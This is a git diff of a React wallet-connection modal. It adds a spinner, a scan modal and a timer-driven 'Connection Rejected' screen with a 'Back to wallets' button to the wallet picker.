@@ -1,12 +1,14 @@
-import React, { useContext } from 'react';
+import React, { useContext, useState } from 'react';
 import Backdrop from '@mui/material/Backdrop';
 import Box from '@mui/material/Box';
 import Modal from '@mui/material/Modal';
 import Fade from '@mui/material/Fade';
 import Typography from '@mui/material/Typography';
-import { CloseButton, InfoFilledIcon, InfoIcon } from '../assets/icons';
+import { CloseButton, InfoFilledIcon } from '../assets/icons';
 import { myContext } from '../MyContext';
-import { coinbaseLogo, logo, optimisonLogo, walletConnecLogo } from '../assets/images';
+import { coinbaseLogo, logo, walletConnecLogo } from '../assets/images';
+import Spinner from './spinner';
+import ScanWalletModal from './scanModal';
 
 export const style = {
     position: 'absolute',
@@ -14,14 +16,11 @@ export const style = {
     left: '50%',
     height: "440px",
     transform: 'translate(-50%, -50%)',
-    // width: 400,
     borderRadius: "15px",
     marginTop: "2.5em",
     bgcolor: '#2E2E34',
-    // border: '1px solid #4C4E57',
     outline: "none",
     boxShadow: 24,
-    // overFlowX: "hidden"
 };
 
 export const styleHeader = {
@@ -33,9 +32,12 @@ export const styleHeader = {
     alignItems: "center"
 }
 
-export default function ConnectWalletModal(props) {
-    const { title, children } = props;
-    const { openWalletModal, setWalletModal } = useContext(myContext)
+export default function ConnectWalletModal() {
+    const { openWalletModal, setWalletModal, setScanWalletModal } = useContext(myContext)
+    const [clickedWalletIndex, setClickedWalletIndex] = useState();
+    const [isRejected, setIsRejected] = useState(false)
+    const [clickedWalletLogo, setClickedWalletLogo] = useState()
+
     const handleClose = () => setWalletModal(false);
 
     const avalWallets = [
@@ -48,6 +50,21 @@ export default function ConnectWalletModal(props) {
             name: "WalletConnect"
         },
     ]
+
+    function handleWalletClick(name) {
+        setClickedWalletIndex(name)
+        setTimeout(() => {
+            setScanWalletModal(true)
+            setTimeout(() => {
+                setIsRejected(true)
+            }, 3000);
+        }, 2000);
+    }
+
+    function backToWallets() {
+        setClickedWalletIndex()
+        setIsRejected(false)
+    }
 
 
     return (
@@ -93,34 +110,72 @@ export default function ConnectWalletModal(props) {
                     </Box>
 
 
-                    <Box className="w-[61%]">
+                    <Box className="w-[61%] relative">
                         <Box sx={styleHeader}>
-                            <Typography className='text-white ps-2'> Available Wallets (2) </Typography>
+                            <Typography className='text-white ps-2'> {!isRejected ? "Available Wallets (2)" : "Connection Rejected"} </Typography>
                             <CloseButton onClick={handleClose} className='text-[32px] shadow-sm cursor-pointer bg-[#34353B] p-1 rounded-full text-zinc-400' />
                         </Box>
-                        <Box className=" overflow-y-scroll hideScrollBar">
+                        <Box className="">
                             <div className='w-[94%] m-auto'>
-                                <div className='text-[#DCEFFA] grid grid-cols-2 gap-2 pt-4'>
-                                    {
-                                        avalWallets.map((wallet, index) => (
-                                            <div key={index} className='border duration-500 rounded-2xl hover:bg-[#34353B] cursor-pointer p-4 border-zinc-700 flex items-center gap-2'>
-                                                <div className='border p-2 h-[3.1em] flex justify-center rounded-2xl border-zinc-600 w-[50px]'>
-                                                    <img src={wallet.logo} alt='' className=' w-full object-contain ' />
-                                                </div>
-                                                <div>{wallet.name}</div>
+                                {
+                                    !isRejected && (
+                                        <>
+                                            <div className='text-[#DCEFFA] grid grid-cols-2 gap-2 pt-4'>
+                                                {
+                                                    avalWallets.map((wallet, index) => (
+                                                        <div key={index} onClick={() => { handleWalletClick(wallet.name); setClickedWalletLogo(wallet.logo) }} className='border duration-500 rounded-2xl hover:bg-[#34353B] cursor-pointer p-4 border-zinc-700 flex items-center gap-2'>
+                                                            <div className='border p-2 h-[3.1em] flex justify-center rounded-2xl border-zinc-600 w-[50px]'>
+                                                                {
+                                                                    clickedWalletIndex === wallet.name ? (
+                                                                        <Spinner />
+                                                                    ) : (
+                                                                        <img src={wallet.logo} alt='' className=' w-full object-contain ' />
+                                                                    )
+                                                                }
+                                                            </div>
+                                                            <div>{wallet.name}</div>
+                                                        </div>
+                                                    ))
+                                                }
                                             </div>
-                                        ))
-                                    }
-                                </div>
 
-                                <div className='flex justify-between bg-[#FFEFCC] rounded-xl p-3 mt-2'>
-                                    <div className='text-[12px]'>
-                                        <div className='text-[#71530F]'>Why don't I see my wallet?</div>
-                                        <div>Click here to learn more</div>
-                                    </div>
-                                    <InfoFilledIcon className='text-[#664600] text-[20px]' />
-                                </div>
+                                            <div className='flex justify-between bg-[#FFEFCC] rounded-xl p-3 mt-2'>
+                                                <div className='text-[12px] text-[#6370E5]'>
+                                                    <div className='text-[#71530F]'>Why don't I see my wallet?</div>
+                                                    <div >Click here to learn more</div>
+                                                </div>
+                                                <InfoFilledIcon className='text-[#664600] text-[20px]' />
+                                            </div>
+                                        </>
+                                    )
+                                }
+                                {
+                                    isRejected && (
+                                        <>
+                                            <div className='flex gap-12 bg-[#FFEFCC] rounded-3xl p-4 mt-4'>
+                                                <div className='flex items-center relative '>
+                                                    <div className='w-[40px] border flex justify-center items-center rounded-xl bg-[#EBEBED] border-[#FFAF00] h-[40px]'>
+                                                        <img src={logo} alt='wallet' className='w-1/2' />
+                                                    </div>
+                                                    <div className='w-[40px] border absolute right-[-2em] flex justify-center items-center rounded-xl bg-white border-[#FFAF00] h-[40px]'>
+                                                        <img src={clickedWalletLogo} alt='wallet' className='w-1/2' />
+                                                    </div>
+                                                </div>
+                                                <div className='text-[12px] text-[#6370E5]'>
+                                                    <div className='text-[#71530F] text-[16px]'>Connection Rejected!</div>
+                                                    <div>Click here to try again</div>
+                                                </div>
+                                            </div>
+                                            <div onClick={backToWallets} className=' bottom-8 absolute flex justify-center items-center w-full '>
+                                                <button className='bg-[#FFFFFF]  text-[13px] px-4 font-bold text-[#33394B] py-1 rounded-full'>
+                                                    Back to wallets
+                                                </button>
+                                            </div>
+                                        </>
+                                    )
+                                }
                             </div>
+                            <ScanWalletModal />
                         </Box>
                     </Box>
                 </Box>
